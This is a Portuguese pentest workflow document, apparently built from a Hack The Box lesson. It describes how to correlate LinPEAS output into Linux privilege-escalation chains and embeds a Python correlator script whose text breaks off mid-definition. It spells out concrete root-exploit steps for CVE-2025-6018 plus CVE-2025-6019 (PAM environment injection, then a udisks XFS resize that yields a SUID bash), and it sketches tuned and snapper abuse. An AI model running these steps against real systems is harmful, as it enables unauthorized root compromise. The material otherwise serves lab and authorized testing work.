````markdown
# Fase 4g: Correlação de Privesc — Motor de Cadeias CVE
## Target: {{TARGET}} ({{TARGET_IP}})

> **Input:** Output do LinPEAS (evidence/linpeas_*.txt) + /etc/os-release + versões de pacotes
> **Output:** Cadeias de exploração priorizadas com CVEs compostos
> **Quando:** IMEDIATAMENTE após a Fase 4f (Post-Shell Enum)

---

## Ferramenta Automatizada

O script `privesc_correlator.py` está embutido no final deste documento.
Para extrair e usar:

```bash
# Extrair o script do markdown (gera scripts/privesc_correlator.py)
sed -n '/^# --- BEGIN CORRELATOR ---$/,/^# --- END CORRELATOR ---$/p' \
  workflow/04g-privesc-correlation.md | sed '1d;$d' > scripts/privesc_correlator.py
chmod +x scripts/privesc_correlator.py

# Usar com LinPEAS output
python3 scripts/privesc_correlator.py --linpeas evidence/linpeas_output.txt

# Usar com dados extras (os-release, rpm list, etc.)
python3 scripts/privesc_correlator.py --linpeas evidence/linpeas_output.txt \
  --extra evidence/os-release.txt evidence/rpm-list.txt

# Output em Markdown para deliverable
python3 scripts/privesc_correlator.py --linpeas evidence/linpeas_output.txt --markdown \
  > deliverables/privesc_correlation.md
```

---

## Por Que Esta Fase Existe

**Lição aprendida (Pterodactyl):** O LinPEAS forneceu TODOS os dados necessários para
identificar CVE-2025-6018 + CVE-2025-6019, mas a correlação entre fragmentos de
informação espalhados pelo output não foi feita:

| Dado isolado | Onde no LinPEAS | Sozinho parece... | Combinado significa... |
|---|---|---|---|
| openSUSE Leap 15.6 | OS info | Contexto genérico | Distro com PAM config específica |
| PAM 1.3.0 | rpm -q | Versão antiga | `user_readenv=1` por padrão → env injection |
| udisksd como root | D-Bus Analysis | Serviço padrão | allow_active=yes → mount sem nosuid |
| Sessão SSH = inactive | loginctl | Barreira ao polkit | Gap que precisa de bridge |
| polkitd ativo | D-Bus Analysis | Componente padrão | Session type controlado por PAM variables |

**Nenhum dado isolado grita "privesc aqui". A cadeia surge da correlação.**

---

## Modelo Mental: Privesc como Grafo Dirigido

```
[Estado Atual]  ──(CVE/técnica)──>  [Estado Intermediário]  ──(CVE/técnica)──>  [root]

Exemplo concreto desta box:
[SSH user, inactive]  ──(CVE-2025-6018)──>  [SSH user, allow_active]  ──(CVE-2025-6019)──>  [euid=0 root]
     PAM env injection                         udisks XFS resize
     ~/.pam_environment                        loop-setup + Filesystem.Resize
     XDG_SEAT=seat0, XDG_VTNR=1              monta /tmp sem nosuid → SUID bash
```

A correlação deve **construir esse grafo** a partir dos dados do LinPEAS.

---

## Regras de Correlação Obrigatórias

### REGRA 1: OS-Specific CVE Pipeline
**Trigger:** Qualquer OS identificado em /etc/os-release
**Ação:**

```bash
# Extrair distro + versão EXATA
cat /etc/os-release | grep -E '^(NAME|VERSION_ID|PRETTY_NAME|ID)='

# Pesquisar CVEs recentes ESPECÍFICOS da distro (últimos 18 meses)
# NÃO pesquisar apenas "Linux kernel CVE" genérico — pesquisar:
#   "<distro> <versão>" privilege escalation CVE
#   "<distro>" LPE CVE 2025 2026
#   site:suse.com/security/cve  (para SUSE/openSUSE)
#   site:ubuntu.com/security/CVE (para Ubuntu)
#   site:access.redhat.com/security/cve (para RHEL/Fedora)
```

**Fontes por distro:**
| Distro | CVE Database Oficial |
|---|---|
| openSUSE / SLES | https://www.suse.com/security/cve/ |
| Ubuntu | https://ubuntu.com/security/cves |
| Debian | https://security-tracker.debian.org/tracker/ |
| RHEL / Fedora | https://access.redhat.com/security/security-updates/ |
| Arch | https://security.archlinux.org/ |

> **Erro fatal anterior:** Identificar "openSUSE Leap 15.6" e não pesquisar em
> suse.com/security/cve por CVEs recentes. A SUSE publica advisories com detalhes
> de pacotes afetados e versões fixadas — é a fonte primária.

---

### REGRA 2: PAM Chain Analysis
**Trigger:** Versão do PAM identificada (rpm -q pam / dpkg -l libpam)
**Checklist:**

```
SE pam < 1.4.0:
  → user_readenv = 1 POR PADRÃO
  → Usuário controla ~/.pam_environment
  → Verificar: pam_env é chamado ANTES de pam_systemd?
    → cat /etc/pam.d/common-auth (SUSE) ou /etc/pam.d/sshd
    → Se sim: variáveis PAM do usuário influenciam pam_systemd
    → Variáveis perigosas: XDG_SEAT, XDG_VTNR, XDG_SESSION_ID
    → XDG_SEAT=seat0 + XDG_VTNR=1 → sessão vira "allow_active"
  → FLAG: 🔴 CRÍTICO — PAM session hijacking possível

SE pam >= 1.4.0 e < 1.5.0:
  → user_readenv = 0 POR PADRÃO (mas pode ser habilitado)
  → Verificar se user_readenv=1 está explícito em /etc/pam.d/sshd
  → Se sim: mesma cadeia acima

SE pam >= 1.5.0:
  → user_readenv deprecated
  → Provavelmente não explorável (mas verificar config)
```

**Correlação com distro:**
| Distro | PAM user_readenv default | Vulnerável? |
|---|---|---|
| openSUSE Leap 15.x | 1 (via common-auth) | ✅ CVE-2025-6018 |
| SUSE Enterprise 15.x | 1 (via common-auth) | ✅ CVE-2025-6018 |
| Debian 12 | 1 (explícito em sshd) | ⚠️ Parcial (close_session only) |
| Ubuntu 24.04 | 1 (explícito em sshd) | ⚠️ Parcial (close_session only) |
| Debian 13+ | 0 | ❌ |

---

### REGRA 3: Polkit Session Gap Analysis
**Trigger:** polkitd ativo + sessão SSH (inactive/remote)
**Ação:**

```bash
# 1. Listar TODAS as ações com allow_active=yes
grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions/

# 2. Para cada uma, verificar o que permite fazer
for f in $(grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions/); do
  echo "=== $f ==="
  grep -B5 'allow_active.*yes' "$f" | grep -E '<action|<description|allow_'
done

# 3. Testar se estamos active ou inactive
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
# 'challenge' ou 'auth_admin_keep' = inactive
# 'yes' = allow_active confirmado

# 4. Se inactive: BUSCAR bridge para active (REGRA 2 - PAM)
# 5. Se active: BUSCAR ação destrutiva (REGRA 4 - D-Bus chain)
```

**Ações allow_active=yes de alto impacto (priorizar):**
| Ação | Serviço | Impacto se explorada |
|---|---|---|
| org.freedesktop.udisks2.filesystem-* | udisksd | Mount/resize fs → SUID plant |
| org.freedesktop.udisks2.loop-setup | udisksd | Setup loop devices com fs malicioso |
| org.freedesktop.login1.reboot | systemd-logind | Reboot (DoS, mas útil como indicador) |
| org.freedesktop.NetworkManager.* | NetworkManager | Reconfig rede |
| com.redhat.tuned.* | tuned | Execução de scripts (CVE-2024-52336) |
| org.opensuse.Snapper.* | snapperd | Manipulação de snapshots btrfs |

---

### REGRA 4: D-Bus → Polkit → Root Chain Builder
**Trigger:** Serviço D-Bus rodando como root com polkit allow_active=yes
**Ação:**

```
Para CADA serviço D-Bus rodando como root:
  1. Qual polkit action ele usa?
  2. allow_active = yes?
  3. O que a ação permite fazer?
  4. Pode ser abusada para:
     a. Montar filesystem sem nosuid/nodev → plantar SUID binary
     b. Escrever arquivo como root → cron job, sudoers, authorized_keys
     c. Executar comando como root → RCE direto
     d. Modificar config de rede → MITM, DNS hijack
     e. Manipular snapshots → restore com backdoor
```

**Chain builder para udisks2 (CVE-2025-6019):**
```
udisksd (root) + allow_active=yes
  ├── loop-setup: monta imagem controlada pelo atacante
  ├── filesystem-mount: monta com nosuid/nodev (seguro)
  ├── filesystem-resize: chama libblockdev → xfs_growfs
  │   └── libblockdev MONTA em /tmp SEM nosuid/nodev ← VULN!
  │       └── XFS image com SUID bash → executar → root
  └── Pré-requisito: sessão allow_active (REGRA 2/3)
```

---

### REGRA 5: Multi-Step Chain Composition
**Trigger:** Nenhum vetor direto unprivileged→root encontrado
**Ação:**

```
NÃO desistir. Decompor:

1. Listar todos os vetores "parciais" encontrados:
   - unprivileged → allow_active (PAM env, session hijack, etc.)
   - allow_active → root (udisks, tuned, snapper, etc.)
   - unprivileged → user2 (password reuse, SSH key, sudo -l)
   - user2 → root (sudo rules, group membership, SUID)

2. Construir grafo de estados:
   [current_user, inactive] → [current_user, active] → [root]
   [current_user] → [user2] → [root]
   [current_user] → [service_account] → [root]

3. Para cada par de estados adjacentes, verificar se existe CVE/técnica
   que faz a transição.

4. Priorizar por:
   - Menor número de hops
   - Menor complexidade
   - Exploit público disponível
```

---

## Checklist de Execução Rápida

Após LinPEAS, executar esta correlação (< 10 minutos):

- [ ] **OS check:** `/etc/os-release` → pesquisar CVEs recentes da distro
- [ ] **PAM version:** `rpm -q pam` / `dpkg -l libpam` → REGRA 2
- [ ] **PAM config:** `cat /etc/pam.d/common-auth /etc/pam.d/sshd` → user_readenv?
- [ ] **Session type:** `loginctl show-session` / `CanReboot()` → active vs inactive?
- [ ] **Polkit actions:** `grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions/`
- [ ] **D-Bus root services:** `busctl list | grep root` → quais usam polkit?
- [ ] **udisks2 presente?** → Se sim + allow_active=yes → CVE-2025-6019 chain
- [ ] **Snapper presente?** → Se sim → pesquisar CVEs de snapshot manipulation
- [ ] **tuned presente?** → Se sim → CVE-2024-52336
- [ ] **Cadeias possíveis:** Combinar achados em chains multi-step

---

## Correlações Conhecidas (Base de Conhecimento)

### Chain 1: PAM env → polkit bypass → udisks → root (openSUSE/SUSE 15)
```
Pré-condições:
  - openSUSE Leap 15.x OU SUSE Enterprise 15.x
  - PAM 1.3.0 (user_readenv=1 por padrão)
  - udisksd rodando como root
  - polkit com allow_active=yes para udisks2 actions
  - xfs_growfs disponível no sistema

Cadeia:
  1. echo 'XDG_SEAT OVERRIDE=seat0' > ~/.pam_environment
     echo 'XDG_VTNR OVERRIDE=1' >> ~/.pam_environment
  2. Reconectar SSH (nova sessão com PAM env injetado)
  3. Verificar: gdbus call ... CanReboot → deve retornar 'yes'
  4. Criar XFS image com SUID-root bash (na máquina atacante)
  5. Transferir para alvo
  6. udisksctl loop-setup --file xfs.image
  7. Start background loop: while true; do /tmp/blockdev*/bash -c 'sleep 10' && break; done &
  8. gdbus call ... Filesystem.Resize 0 '{}'
  9. /tmp/blockdev*/bash -p → euid=0

CVEs: CVE-2025-6018 + CVE-2025-6019
Refs: https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
```

### Chain 2: tuned D-Bus → script execution → root (RHEL/Fedora/CentOS)
```
Pré-condições:
  - tuned service ativo (com.redhat.tuned)
  - polkit allow_active=yes para com.redhat.tuned.control
  - Sessão allow_active (local ou exploitada via PAM)

Cadeia:
  1. Obter allow_active (se necessário, via PAM chain)
  2. Criar tuned profile malicioso com script_exec
  3. Ativar via D-Bus → executa como root

CVE: CVE-2024-52336
Refs: https://security.opensuse.org/2024/11/26/tuned-instance-create.html
```

### Chain 3: Snapper D-Bus → snapshot restore → persistence (openSUSE/SUSE)
```
Pré-condições:
  - snapper instalado e activatable via D-Bus
  - Btrfs filesystem com subvolumes
  - snapper-timeline.timer ativo (cria snapshots periódicos)

Cadeia:
  1. Obter allow_active (via PAM chain se necessário)
  2. Listar snapshots: busctl call org.opensuse.Snapper ... ListSnapshots
  3. Restaurar snapshot com backdoor previamente plantada
  4. Ou: criar snapshot, modificar, restaurar sobre sistema atual

CVEs: Pesquisar "snapper" + "privilege escalation" + versão
```

### Chain 4: udisks2 OOB read → info leak → targeted exploit
```
Pré-condições:
  - udisksd rodando como root
  - Versão vulnerável a CVE-2025-8067

Cadeia (teórica):
  1. OOB read em udisksd → leak de memória
  2. Usar info leakada para construir exploit mais preciso
  
Nota: Sozinho não dá root. Requer composição com outro vetor.
CVE: CVE-2025-8067
```

---

## Sinais Ignorados Frequentemente (Anti-Patterns)

| O que parece inocente | O que realmente significa |
|---|---|
| "PAM version 1.3.0" | user_readenv=1 → env injection → session hijack |
| "udisksd running as root" | Se allow_active=yes → mount sem nosuid possível |
| "Session type: remote" | Polkit bloqueia → mas PAM pode criar bridge |
| "org.opensuse.Snapper (activatable)" | Serviço dormindo até D-Bus call → ataque sob demanda |
| "Btrfs filesystem" | Subvolumes + snapper = snapshot manipulation |
| "wickedd running as root" | Serviço de rede openSUSE-specific → pesquisar CVEs |
| "/etc/pam.d/common-auth has pam_env" | pam_env ANTES de pam_systemd = variáveis controladas |

---

## Integração com Outras Fases

```
Fase 4f (Post-Shell Enum)
    │
    ├── LinPEAS output
    ├── Versões de pacotes
    ├── D-Bus listing
    ├── Polkit actions
    ├── Session type
    │
    ▼
Fase 4g (Correlação) ← ESTA FASE
    │
    ├── Cadeias identificadas
    ├── CVEs priorizados
    ├── PoCs documentados
    │
    ▼
Exploração dirigida (sem tentar coisas aleatórias)
```

---

## Deliverable

Ao final desta fase, produzir:

```markdown
# Privesc Correlation Report — {{TARGET}}

## Estado Atual
- User: [username]
- Session: [active/inactive/remote]
- Groups: [lista]

## Dados Correlacionados
| Dado | Valor | Fonte | Implicação |
|---|---|---|---|
| OS | openSUSE Leap 15.6 | /etc/os-release | CVEs SUSE-specific |
| PAM | 1.3.0 | rpm -q pam | user_readenv=1 → env injection |
| ... | ... | ... | ... |

## Cadeias de Exploração (priorizadas)
### Chain 1: [mais provável]
- CVEs: ...
- Complexidade: BAIXA/MÉDIA/ALTA
- Exploit público: SIM/NÃO
- Passos: ...

### Chain 2: [alternativa]
...

## CVEs para Pesquisar
1. Pesquisar: "<distro> <versão>" + LPE + 2025
2. Pesquisar: "pam <versão>" + privilege escalation
3. ...
```

---

## Script: Privesc Correlator (embutido)

O código abaixo é o motor de correlação automática. Use o comando `sed`
documentado no início deste arquivo para extraí-lo para `scripts/privesc_correlator.py`.

# --- BEGIN CORRELATOR ---
#!/usr/bin/env python3
"""
TAFFAI Privesc Correlator — Motor de Correlação Automática CVE
=============================================================

Analisa output do LinPEAS + dados de enumeração e correlaciona fragmentos
de informação para sugerir cadeias de exploração multi-step.

Uso:
  # Opção 1: Alimentar com LinPEAS output
  python3 privesc_correlator.py --linpeas evidence/linpeas_output.txt

  # Opção 2: Alimentar com dados individuais
  python3 privesc_correlator.py --os-release /tmp/os-release.txt \
                                 --rpm-list /tmp/rpm-list.txt \
                                 --dbus-list /tmp/dbus-list.txt

  # Opção 3: Interativo (cola dados manualmente)
  python3 privesc_correlator.py --interactive

  # Opção 4: Via SSH direto no alvo
  python3 privesc_correlator.py --ssh user@host

Baseado nas lições do Pterodactyl (HTB):
  - CVE-2025-6018 (PAM env injection → polkit bypass)
  - CVE-2025-6019 (udisks2 XFS resize → mount sem nosuid → root)
"""

import argparse
import re
import sys
import json
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Optional


# ============================================================================
# Modelos de Dados
# ============================================================================

class Severity(Enum):
    CRITICAL = auto()
    HIGH = auto()
    MEDIUM = auto()
    LOW = auto()
    INFO = auto()

    def __str__(self):
        colors = {
            "CRITICAL": "\033[91m",  # vermelho
            "HIGH": "\033[93m",      # amarelo
            "MEDIUM": "\033[96m",    # ciano
            "LOW": "\033[94m",       # azul
            "INFO": "\033[90m",      # cinza
        }
        reset = "\033[0m"
        return f"{colors.get(self.name, '')}{self.name}{reset}"


@dataclass
class Finding:
    """Um achado individual extraído da enumeração."""
    category: str
    key: str
    value: str
    source: str
    implication: str = ""
    severity: Severity = Severity.INFO


@dataclass
class Chain:
    """Uma cadeia de exploração composta por múltiplos passos."""
    name: str
    cves: list
    severity: Severity
    complexity: str  # BAIXA, MÉDIA, ALTA
    preconditions: list
    steps: list
    references: list = field(default_factory=list)
    confidence: str = "ALTA"  # ALTA, MÉDIA, BAIXA
    notes: str = ""


@dataclass
class CorrelationReport:
    """Relatório completo de correlação."""
    findings: list = field(default_factory=list)
    chains: list = field(default_factory=list)
    research_needed: list = field(default_factory=list)


# ============================================================================
# Extratores — Extraem dados brutos do LinPEAS ou de fontes individuais
# ============================================================================

class DataExtractor:
    """Extrai dados estruturados de output do LinPEAS ou fontes individuais."""

    def __init__(self):
        self.findings: list[Finding] = []

    def extract_from_linpeas(self, content: str) -> list[Finding]:
        """Extrai todos os dados relevantes do output do LinPEAS."""
        self.findings = []
        self._extract_os_info(content)
        self._extract_pam_info(content)
        self._extract_dbus_services(content)
        self._extract_polkit_info(content)
        self._extract_session_info(content)
        self._extract_package_versions(content)
        self._extract_filesystem_info(content)
        self._extract_suid_binaries(content)
        self._extract_sudo_info(content)
        self._extract_cron_info(content)
        return self.findings

    def _extract_os_info(self, content: str):
        """Extrai informações do OS."""
        # /etc/os-release patterns — use line-based matching
        patterns = {
            "os_name": r'^PRETTY_NAME="([^"]+)"',
            "os_version": r'^VERSION_ID="([^"]+)"',
            "os_id": r'^ID="?([a-z][a-z0-9_-]+)"?\s*$',
            "os_id_like": r'^ID_LIKE="?([^"\n]+)"?',
        }
        for key, pattern in patterns.items():
            match = re.search(pattern, content, re.MULTILINE)
            if match:
                self.findings.append(Finding(
                    category="OS",
                    key=key,
                    value=match.group(1).strip(),
                    source="/etc/os-release",
                ))

        # Kernel
        kernel_match = re.search(r'Linux\s+\S+\s+([\d\.\-]+\S+)', content)
        if kernel_match:
            self.findings.append(Finding(
                category="OS",
                key="kernel",
                value=kernel_match.group(1),
                source="uname",
            ))

    def _extract_pam_info(self, content: str):
        """Extrai versão e configuração do PAM."""
        pam_patterns = [
            r'\bpam-(\d+\.\d+\.\d+)',
            r'\blibpam-modules[_:-]+(\d+\.\d+\.\d+)',
            r'\blibpam[_-]runtime[_:-]+(\d+\.\d+\.\d+)',
            r'\bpam\s+(\d+\.\d+\.\d+)',
        ]
        for p in pam_patterns:
            match = re.search(p, content, re.IGNORECASE)
            if match:
                self.findings.append(Finding(
                    category="PAM",
                    key="version",
                    value=match.group(1),
                    source="package manager",
                ))
                break

        # user_readenv
        if re.search(r'user_readenv\s*=?\s*1', content):
            self.findings.append(Finding(
                category="PAM",
                key="user_readenv",
                value="1 (explícito)",
                source="pam config",
                severity=Severity.HIGH,
                implication="Usuário controla variáveis de ambiente via ~/.pam_environment",
            ))
        elif re.search(r'pam_env\.so', content):
            self.findings.append(Finding(
                category="PAM",
                key="pam_env_present",
                value="sim",
                source="pam config",
                implication="pam_env.so encontrado — verificar user_readenv default para versão",
            ))

    def _extract_dbus_services(self, content: str):
        """Extrai serviços D-Bus, especialmente os rodando como root."""
        # busctl list patterns
        dbus_root_pattern = re.compile(
            r'(org\.\S+)\s+\d+\s+\S+\s+root\s', re.MULTILINE
        )
        for match in dbus_root_pattern.finditer(content):
            svc = match.group(1)
            self.findings.append(Finding(
                category="D-Bus",
                key="root_service",
                value=svc,
                source="busctl list",
                implication=f"Serviço D-Bus rodando como root: {svc}",
            ))

        # Padrões conhecidos mesmo sem busctl
        known_root_services = [
            ("udisksd", "org.freedesktop.UDisks2"),
            ("polkitd", "org.freedesktop.PolicyKit1"),
            ("systemd-logind", "org.freedesktop.login1"),
            ("NetworkManager", "org.freedesktop.NetworkManager"),
            ("tuned", "com.redhat.tuned"),
            ("snapperd", "org.opensuse.Snapper"),
            ("wickedd", "org.opensuse.Network"),
            ("packagekitd", "org.freedesktop.PackageKit"),
        ]
        for proc_name, dbus_name in known_root_services:
            if re.search(rf'\b{proc_name}\b', content, re.IGNORECASE):
                # Evitar duplicatas
                if not any(f.value == dbus_name for f in self.findings if f.key == "root_service"):
                    self.findings.append(Finding(
                        category="D-Bus",
                        key="root_service",
                        value=dbus_name,
                        source="process list",
                    ))

    def _extract_polkit_info(self, content: str):
        """Extrai informações de polkit/PolicyKit."""
        # Versões
        polkit_ver = re.search(r'polkit[_-](\d+[\d\.]*\d)', content, re.IGNORECASE)
        if polkit_ver:
            self.findings.append(Finding(
                category="polkit",
                key="version",
                value=polkit_ver.group(1),
                source="package manager",
            ))

        # allow_active patterns — use line-by-line to avoid catastrophic backtracking
        # First find all action ids, then look for allow_active near them
        action_blocks = re.split(r'<action\s+id="', content)
        for block in action_blocks[1:]:
            id_match = re.match(r'([^"]+)', block)
            if not id_match:
                continue
            action_id_candidate = id_match.group(1)
            aa_match = re.search(r'<allow_active>(\w+)</allow_active>', block[:2000])
            if not aa_match:
                continue
            # Simulate the old match interface
            class _M:
                def __init__(self, aid, val):
                    self._groups = (aid, val)
                def group(self, n):
                    return self._groups[n - 1]
            match = _M(action_id_candidate, aa_match.group(1))
            action_id = match.group(1)
            allow_val = match.group(2)
            if allow_val == "yes":
                self.findings.append(Finding(
                    category="polkit",
                    key="allow_active_yes",
                    value=action_id,
                    source="polkit actions",
                    severity=Severity.MEDIUM,
                    implication=f"Ação {action_id} permitida para sessões ativas sem senha",
                ))

        # Referências textuais a allow_active
        if re.search(r'allow_active.*?yes', content, re.IGNORECASE):
            self.findings.append(Finding(
                category="polkit",
                key="allow_active_found",
                value="sim",
                source="polkit grep",
                implication="Polkit actions com allow_active=yes encontradas",
            ))

    def _extract_session_info(self, content: str):
        """Extrai informações de sessão (loginctl, systemd)."""
        # Session type
        session_patterns = [
            (r'Type=(\w+)', "session_type"),
            (r'Active=(\w+)', "session_active"),
            (r'Remote=(\w+)', "session_remote"),
            (r'Seat=(\S*)', "session_seat"),
        ]
        for pattern, key in session_patterns:
            match = re.search(pattern, content)
            if match:
                self.findings.append(Finding(
                    category="Session",
                    key=key,
                    value=match.group(1),
                    source="loginctl",
                ))

        # CanReboot check
        can_reboot = re.search(r"CanReboot.*?'(\w+)'", content)
        if can_reboot:
            val = can_reboot.group(1)
            self.findings.append(Finding(
                category="Session",
                key="can_reboot",
                value=val,
                source="D-Bus CanReboot",
                severity=Severity.HIGH if val == "yes" else Severity.INFO,
                implication="Sessão já é allow_active!" if val == "yes" else "Sessão é inactive — precisa de bridge",
            ))

    def _extract_package_versions(self, content: str):
        """Extrai versões de pacotes críticos para privesc."""
        critical_packages = {
            "udisks2": r'udisks2?[_-](\d+[\d\.]+\d)',
            "systemd": r'systemd[_-](\d+[\d\.]*\d)',
            "sudo": r'sudo[_-](\d+[\d\.]+\d)',
            "snapd": r'snapd[_-](\d+[\d\.]+\d)',
            "pkexec": r'pkexec.*?(\d+[\d\.]+\d)',
            "dbus": r'dbus[_-](\d+[\d\.]+\d)',
            "tuned": r'tuned[_-](\d+[\d\.]+\d)',
            "snapper": r'snapper[_-](\d+[\d\.]+\d)',
            "libblockdev": r'libblockdev[_-](\d+[\d\.]+\d)',
        }
        for pkg, pattern in critical_packages.items():
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                self.findings.append(Finding(
                    category="Package",
                    key=pkg,
                    value=match.group(1),
                    source="package manager",
                ))

    def _extract_filesystem_info(self, content: str):
        """Extrai informações de filesystem relevantes."""
        if re.search(r'\bbtrfs\b', content, re.IGNORECASE):
            self.findings.append(Finding(
                category="Filesystem",
                key="btrfs",
                value="presente",
                source="mount/df",
                implication="Btrfs = subvolumes + snapshots (snapper?)",
            ))
        if re.search(r'\bxfs\b', content, re.IGNORECASE):
            self.findings.append(Finding(
                category="Filesystem",
                key="xfs",
                value="presente",
                source="mount/df",
            ))

        # xfs_growfs binary
        if re.search(r'xfs_growfs', content):
            self.findings.append(Finding(
                category="Filesystem",
                key="xfs_growfs",
                value="disponível",
                source="filesystem tools",
                implication="xfs_growfs disponível — necessário para CVE-2025-6019",
            ))

    def _extract_suid_binaries(self, content: str):
        """Extrai binários SUID relevantes."""
        suid_pattern = re.compile(r'-[rwx]*s[rwx-]*\s.*?(/\S+)', re.MULTILINE)
        seen = set()
        for match in suid_pattern.finditer(content):
            binary = match.group(1)
            if binary in seen:
                continue
            seen.add(binary)
            # Apenas binários não-padrão
            standard_suid = {
                '/usr/bin/passwd', '/usr/bin/chsh', '/usr/bin/chfn',
                '/usr/bin/newgrp', '/usr/bin/gpasswd', '/usr/bin/su',
                '/usr/bin/mount', '/usr/bin/umount', '/usr/bin/ping',
                '/usr/bin/fusermount', '/usr/bin/fusermount3',
                '/usr/bin/sudo', '/usr/bin/crontab',
                '/usr/bin/chage', '/usr/bin/expiry',
                '/usr/bin/newgidmap', '/usr/bin/newuidmap',
                '/usr/bin/at',
                '/usr/lib/dbus-1.0/dbus-daemon-launch-helper',
                '/usr/lib/dbus-1/dbus-daemon-launch-helper',
                '/usr/lib/polkit-1/polkit-agent-helper-1',
                '/usr/lib/utempter/utempter',
                '/usr/lib/openssh/ssh-keysign',
                '/usr/sbin/postdrop', '/usr/sbin/postqueue', '/usr/sbin/postlog',
                '/sbin/mount.nfs', '/sbin/unix_chkpwd', '/sbin/unix2_chkpwd',
                '/usr/sbin/unix_chkpwd', '/usr/sbin/unix2_chkpwd',
            }
            if binary not in standard_suid:
                self.findings.append(Finding(
                    category="SUID",
                    key="non_standard",
                    value=binary,
                    source="find / -perm -4000",
                    severity=Severity.MEDIUM,
                ))

    def _extract_sudo_info(self, content: str):
        """Extrai informações de sudo."""
        if re.search(r'targetpw', content, re.IGNORECASE):
            self.findings.append(Finding(
                category="Sudo",
                key="targetpw",
                value="1",
                source="sudoers",
                implication="sudo requer senha do TARGET, não do usuário atual. Bloqueia sudo sem senha de root.",
            ))

        # NOPASSWD
        nopasswd = re.findall(r'^(\S+)\s+ALL[^\n]*NOPASSWD[^\n]*?(\S+)\s*$', content, re.MULTILINE)
        for user, cmd in nopasswd:
            self.findings.append(Finding(
                category="Sudo",
                key="nopasswd",
                value=f"{user} → {cmd}",
                source="sudoers",
                severity=Severity.HIGH,
            ))

    def _extract_cron_info(self, content: str):
        """Extrai cron jobs relevantes."""
        # Use line-based matching to avoid catastrophic backtracking
        for line in content.split('\n'):
            # /etc/cron entries
            cron_match = re.search(r'(/etc/cron\S+/\S+)', line)
            if cron_match:
                self.findings.append(Finding(
                    category="Cron",
                    key="job",
                    value=cron_match.group(1).strip(),
                    source="crontab",
                ))
            # root cron entries
            if 'root' in line and '*' in line:
                root_cron = re.search(r'(\S+)\s+\*[^\n]*root\s+(\S+)', line)
                if root_cron:
                    self.findings.append(Finding(
                        category="Cron",
                        key="job",
                        value=root_cron.group(0).strip(),
                        source="crontab",
                    ))


# ============================================================================
# Correladores — Aplicam regras de correlação sobre findings
# ============================================================================

class Correlator:
    """Aplica regras de correlação sobre findings para gerar chains."""

    def __init__(self, findings: list[Finding]):
        self.findings = findings
        self.chains: list[Chain] = []
        self.research: list[str] = []

    def _get(self, category: str, key: str) -> Optional[str]:
        """Busca valor de um finding por categoria e chave."""
        for f in self.findings:
            if f.category == category and f.key == key:
                return f.value
        return None

    def _has(self, category: str, key: str, value: str = None) -> bool:
        """Verifica se um finding existe."""
        for f in self.findings:
            if f.category == category and f.key == key:
                if value is None:
                    return True
                if value.lower() in f.value.lower():
                    return True
        return False

    def _get_all(self, category: str, key: str) -> list[str]:
        """Busca todos os valores de findings por categoria e chave."""
        return [f.value for f in self.findings if f.category == category and f.key == key]

    def correlate_all(self) -> tuple[list[Chain], list[str]]:
        """Executa todas as regras de correlação."""
        self._rule1_os_specific_cves()
        self._rule2_pam_chain()
        self._rule3_polkit_session_gap()
        self._rule4_dbus_polkit_root()
        self._rule5_compose_chains()
        return self.chains, self.research

    # -----------------------------------------------------------------------
    # REGRA 1: OS-Specific CVE Pipeline
    # -----------------------------------------------------------------------
    def _rule1_os_specific_cves(self):
        """Gera search queries baseadas no OS identificado."""
        os_id = self._get("OS", "os_id")
        os_name = self._get("OS", "os_name")
        os_version = self._get("OS", "os_version")

        if not os_id and not os_name:
            self.research.append("⚠️  OS não identificado — executar: cat /etc/os-release")
            return

        distro = os_id or os_name or ""
        version = os_version or ""

        # Distro-specific search queries
        search_queries = [
            f'"{distro} {version}" privilege escalation CVE 2025 2026',
            f'"{distro}" LPE CVE 2025',
        ]

        # Distro-specific databases
        db_urls = {
            "opensuse": "https://www.suse.com/security/cve/",
            "sles": "https://www.suse.com/security/cve/",
            "suse": "https://www.suse.com/security/cve/",
            "ubuntu": "https://ubuntu.com/security/cves",
            "debian": "https://security-tracker.debian.org/tracker/",
            "rhel": "https://access.redhat.com/security/security-updates/",
            "fedora": "https://access.redhat.com/security/security-updates/",
            "centos": "https://access.redhat.com/security/security-updates/",
            "arch": "https://security.archlinux.org/",
        }

        for distro_key, url in db_urls.items():
            if distro_key in distro.lower():
                self.research.append(f"🔍 Pesquisar CVEs em: {url}")
                break

        for q in search_queries:
            self.research.append(f"🔍 Google: {q}")

    # -----------------------------------------------------------------------
    # REGRA 2: PAM Chain Analysis
    # -----------------------------------------------------------------------
    def _rule2_pam_chain(self):
        """Analisa PAM para possibilidade de session hijacking."""
        pam_version = self._get("PAM", "version")
        os_id = (self._get("OS", "os_id") or "").lower()

        if not pam_version:
            self.research.append("⚠️  Versão do PAM não identificada — executar: rpm -q pam || dpkg -l libpam-runtime")
            return

        try:
            major, minor, patch = [int(x) for x in pam_version.split(".")[:3]]
        except (ValueError, IndexError):
            self.research.append(f"⚠️  Versão do PAM não parseável: {pam_version}")
            return

        user_readenv_default = False

        # PAM < 1.4.0: user_readenv=1 por padrão
        if major == 1 and minor < 4:
            user_readenv_default = True

        # user_readenv explícito
        user_readenv_explicit = self._has("PAM", "user_readenv", "1")

        if user_readenv_default or user_readenv_explicit:
            # Verificar se é openSUSE/SUSE (cadeia totalmente confirmada)
            is_suse = any(x in os_id for x in ["opensuse", "suse", "sles"])

            confidence = "ALTA" if is_suse else "MÉDIA"
            notes = ""
            if not is_suse:
                notes = (
                    "Em Debian/Ubuntu, pam_env pode ser chamado apenas no close_session. "
                    "Verificar /etc/pam.d/sshd — se pam_env.so está em 'session' (não 'auth'), "
                    "a injeção pode não afetar pam_systemd corretamente."
                )

            self.chains.append(Chain(
                name="PAM Environment Injection → Session Hijacking",
                cves=["CVE-2025-6018"],
                severity=Severity.CRITICAL,
                complexity="BAIXA",
                preconditions=[
                    f"PAM {pam_version} (user_readenv={'default' if user_readenv_default else 'explícito'}=1)",
                    "Acesso SSH como qualquer usuário",
                    "~/.pam_environment gravável",
                    "pam_env.so chamado ANTES de pam_systemd na chain PAM",
                ],
                steps=[
